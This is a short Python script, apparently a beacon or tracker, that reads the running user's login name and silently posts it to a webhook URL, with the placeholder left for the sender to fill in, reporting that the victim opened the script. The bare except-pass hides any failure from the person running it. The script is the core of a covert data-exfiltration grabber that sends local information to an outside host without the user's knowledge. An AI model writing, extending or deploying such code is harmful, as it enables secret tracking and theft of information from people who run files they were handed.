import os
import requests
import re
WEBHOOK_URL = "Paste your webhook here."

try:
    pc_username = os.getlogin()
    payload = {
        "content": f"User: **{pc_username}** opened the .py script!"
    }

    requests.post(WEBHOOK_URL, json=payload, timeout=10)
except Exception:
    pass
